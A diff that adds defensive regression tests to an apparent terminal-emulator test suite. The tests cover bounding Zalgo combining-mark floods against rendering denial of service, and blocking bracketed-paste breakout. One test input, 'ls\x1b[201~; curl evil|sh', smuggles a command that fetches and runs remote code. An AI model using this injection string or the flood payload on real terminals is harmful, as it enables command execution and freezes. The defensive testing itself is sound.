@@ -231,6 +231,44 @@ ok('\u00e9' in _sh_export, 'show mode copies a real printable glyph as itself (e
 ok('\u25a1' in _sh_export and '\u200b' not in _sh_export,
    'show mode copies a no-glyph char as the box, never the raw zero-width byte')
 
+# --- Zalgo flood: a base char plus thousands of stacked combining marks is one
+# grapheme cluster that makes the text engine (Qt in CLI mode, pyte's NFC merge in
+# TUI mode) reshape it in O(n^2) -- seconds of GUI freeze per line. cap_combining_runs
+# (CLI) and _SafeHistoryScreen.draw (TUI) bound the marks per base to the Unicode
+# stream-safe maximum, so a flood renders instantly and a real accent still lands.
+import time as _tz                                       # noqa: E402
+_ac = '\u0301'                                           # combining acute
+# structural: the cap holds in every CLI render mode (100 marks -> at most 32 kept)
+for _zm in ('show', 'box', 'reveal'):
+    _zt = SecureTerminal(command='/bin/cat'); _zt.apply_mode(_zm)
+    feed_output(_zt, ('a' + _ac * 100 + '\n').encode('utf-8'))
+    ok(_zt.toPlainText().count(_ac) <= 32,
+       'zalgo CLI %s: a 100-mark flood is bounded to <= 32 combining marks' % _zm)
+# structural: TUI (pyte) bounds the merged cell too. The trailing CJK char is a
+# non-combining non-ASCII code point (>= U+0300), so the run resets and it renders
+# in its own cell.
+_ztu = SecureTerminal(command='/bin/cat', tui=True)
+_cjk = '\u4f60'                                  # a non-combining CJK char
+feed_output(_ztu, ('a' + _ac * 100 + _cjk + '\n').encode('utf-8'))
+ok(len(_ztu._screen.buffer[0][0].data) <= 34,
+   'zalgo TUI: the merged pyte cell is bounded (base + capped marks), not 100')
+ok(_ztu._screen.buffer[0][1].data == _cjk,
+   'zalgo TUI: a non-combining char after the flood resets the run and lands in its own cell')
+# a real accent after a flood still lands (the run resets, not a permanent gag)
+_zt2 = SecureTerminal(command='/bin/cat'); _zt2.apply_mode('show')
+feed_output(_zt2, ('x' + _ac * 100 + 'y' + _ac + '\n').encode('utf-8'))
+ok(('y' + _ac) in _zt2.toPlainText(),
+   'zalgo: a base char resets the run so a later real accent is not dropped')
+# DoS canary: a large flood (under the pipe buffer) renders fast in both modes;
+# unbounded it would take tens of seconds, so a wide margin is not flaky
+_zc = ('a' + _ac * 4000 + '\n').encode('utf-8')
+_zcli = SecureTerminal(command='/bin/cat'); _zcli.apply_mode('show')
+_t0 = _tz.monotonic(); feed_output(_zcli, _zc)
+ok(_tz.monotonic() - _t0 < 5.0, 'zalgo CLI: a 4000-mark flood renders well under the DoS threshold')
+_ztui = SecureTerminal(command='/bin/cat', tui=True)
+_t0 = _tz.monotonic(); feed_output(_ztui, _zc)
+ok(_tz.monotonic() - _t0 < 5.0, 'zalgo TUI: a 4000-mark flood renders well under the DoS threshold')
+
 # --- "needs TUI" advisory also fires for in-place repaint (zsh ZLE menu) --------
 # The bug: an interactive completion menu (zsh/readline) repaints with cursor-up
 # and uses no alternate screen, so line mode stripped the redraw into garbage
@@ -3829,6 +3867,20 @@ _pmime2.setText('echo hi')
 _pt.insertFromMimeData(_pmime2)
 ok(_pts and _pts[0].startswith(b'\x1b[200~') and _pts[0].endswith(b'\x1b[201~'),
    'paste: bracketed-paste mode wraps the pasted data in the DEC 2004 markers')
+# gap (ai-review): a paste containing the bracketed-paste END marker must NOT break
+# out of the bracketed region and inject a command -- the ESC of an embedded
+# \x1b[201~ is stripped, so the only real END marker is the terminal's own trailing
+# one. Without this a pasted "...\x1b[201~; evil" would run "evil" as typed input.
+_pts.clear()
+_o_pw_bp = _pt.current_paste_warn()
+_pt.apply_paste_warn('never')                       # send directly (test wrap+sanitize)
+_pmime_bp = QMimeData()
+_pmime_bp.setText('ls\x1b[201~; curl evil|sh')
+_pt.insertFromMimeData(_pmime_bp)
+ok(_pts and _pts[0].count(b'\x1b[201~') == 1 and _pts[0].endswith(b'\x1b[201~')
+   and b'\x1b[200~' not in _pts[0][6:],
+   'paste: an embedded bracketed-paste END marker cannot break out (ESC stripped)')
+_pt.apply_paste_warn(_o_pw_bp)
 
 # --- reset_caret with no output cursor snaps to the document end --------------
 _rc = SecureTerminal(command='/bin/cat')
